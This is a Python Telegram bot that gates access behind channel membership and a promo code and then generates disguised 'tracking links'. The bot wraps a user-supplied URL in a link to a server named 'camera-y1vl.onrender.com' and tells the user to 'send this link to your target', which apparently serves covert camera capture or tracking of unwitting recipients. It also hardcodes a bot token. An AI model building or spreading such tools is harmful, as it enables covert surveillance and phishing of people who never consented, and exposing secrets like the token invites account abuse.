import logging
import uuid
import base64
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CallbackQueryHandler, CommandHandler, filters
from telegram.error import TelegramError

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

RENDER_BASE_URL = "https://camera-y1vl.onrender.com"
CHANNEL_USERNAME = "@TeamLolOfficial"
PROMO_LINK = "https://shrinkme.click/JtuERnP3"
CORRECT_PROMO_CODE = "boom"

user_promo_expiry = {}

async def check_channel_membership(bot, user_id):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except TelegramError as e:
        logging.error(f"Error checking membership: {e}")
    return False

def is_promo_valid(user_id):
    if user_id in user_promo_expiry:
        if datetime.now() < user_promo_expiry[user_id]:
            return True
    return False

def get_user_keyboard(user_id):
    if is_promo_valid(user_id):
        keyboard = [["🔗 Create Link"]]
    else:
        keyboard = [["🔗 Create Link"], ["🎟️ USE CODE"]]
        
    return ReplyKeyboardMarkup(
        keyboard,
        resize_keyboard=True,
        input_field_placeholder="Choose an option below..."
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    is_joined = await check_channel_membership(context.bot, user_id)
    if not is_joined:
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
            [InlineKeyboardButton(" Verify", callback_data="verify_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"❌ You must join our official channel before using this bot!\n\nPlease click below to join:",
            reply_markup=reply_markup
        )
        return

    context.user_data['waiting_for_url'] = False
    context.user_data['waiting_for_code'] = False

    await update.message.reply_text(
        "👋 Welcome! Choose an option from below to start.",
        reply_markup=get_user_keyboard(user_id),
        parse_mode="Markdown"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "verify_join":
        is_joined = await check_channel_membership(context.bot, user_id)
        if is_joined:
            verified_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                [InlineKeyboardButton("✅ Verified", callback_data="already_verified")]
            ])
            await query.edit_message_text(
                text="✅ Verification successful! Now click below to start:",
                reply_markup=verified_keyboard
            )
            
            await context.bot.send_message(
                chat_id=user_id,
                text="👋 Welcome! Click below to start using the bot.",
                reply_markup=get_user_keyboard(user_id),
                parse_mode="Markdown"
            )
        else:
            await query.answer("❌ You have not joined the channel yet! Please join first.", show_alert=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user_text = update.message.text.strip()
    
    is_joined = await check_channel_membership(context.bot, user_id)
    if not is_joined:
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
            [InlineKeyboardButton(" Verify", callback_data="verify_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"❌ Please join our channel first:",
            reply_markup=reply_markup
        )
        return

    if user_text == "🎟️ USE CODE":
        if is_promo_valid(user_id):
            await update.message.reply_text(
                "✅ Your promo code is already active!",
                reply_markup=get_user_keyboard(user_id)
            )
        else:
            context.user_data['waiting_for_code'] = True
            context.user_data['waiting_for_url'] = False
            await update.message.reply_text(
                f"🔑 Please enter the promo code.\n\n"
                f"🔗 Get your promo code here: {PROMO_LINK}",
                reply_markup=get_user_keyboard(user_id)
            )
        return

    if context.user_data.get('waiting_for_code', False):
        if user_text.lower() == CORRECT_PROMO_CODE:
            expiry_time = datetime.now() + timedelta(hours=24, minutes=1)
            user_promo_expiry[user_id] = expiry_time
            
            context.user_data['waiting_for_code'] = False
            await update.message.reply_text(
                "🎉 Promo code activated successfully for 24 Hours & 1 Minute!\n\n"
                "Now you can click **🔗 Create Link** to generate your tracking link.",
                reply_markup=get_user_keyboard(user_id),
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                f"❌ Invalid Promo Code!\n\n"
                f"Please get the correct code from here: {PROMO_LINK}",
                reply_markup=get_user_keyboard(user_id)
            )
        return

    if user_text == "🔗 Create Link":
        if not is_promo_valid(user_id):
            context.user_data['waiting_for_url'] = False
            await update.message.reply_text(
                f"🔒 You need an active promo code to create links!\n\n"
                f"1. Go to this link to get code: {PROMO_LINK}\n"
                f"2. Click **🎟️ USE CODE** button below and submit the code.",
                reply_markup=get_user_keyboard(user_id)
            )
            return

        context.user_data['waiting_for_url'] = True
        context.user_data['waiting_for_code'] = False
        await update.message.reply_text(
            "🌐 Please Enter a valid URL:",
            reply_markup=get_user_keyboard(user_id)
        )
        return

    if context.user_data.get('waiting_for_url', False):
        if not is_promo_valid(user_id):
            context.user_data['waiting_for_url'] = False
            await update.message.reply_text(
                f"❌ Promo code expired! Please get a new code from: {PROMO_LINK}",
                reply_markup=get_user_keyboard(user_id)
            )
            return

        target_url = user_text
        if not (target_url.startswith("http://") or target_url.startswith("https://")):
            target_url = "https://" + target_url

        encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode().rstrip("=")
        encoded_cid = base64.urlsafe_b64encode(str(user_id).encode()).decode().rstrip("=")
        
        # লিংকের এক্সপায়ারি টাইম হবে ইউজারের সাবস্ক্রিপশন শেষ হওয়ার এক্স্যাক্ট সময়
        expiry_timestamp = int(user_promo_expiry[user_id].timestamp())
        
        unique_id = str(uuid.uuid4())[:6]
        
        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&cid={encoded_cid}&e={expiry_timestamp}&url={encoded_url}"
        
        response_msg = (
            f"🎯 **Target Tracking Link Created Successfully!**\n\n"
            f"🔗 Original Target: `{target_url}`\n\n"
            f"📤 Send this link to your target:\n{tracking_link}"
        )
        
        context.user_data['waiting_for_url'] = False
        await update.message.reply_text(response_msg, parse_mode="Markdown", reply_markup=get_user_keyboard(user_id))
    else:
        await update.message.reply_text(
            "Please choose an option from the menu below.",
            reply_markup=get_user_keyboard(user_id)
        )

if __name__ == '__main__':
    BOT_TOKEN = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY"
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    print("Bot is running...")
    application.run_polling()
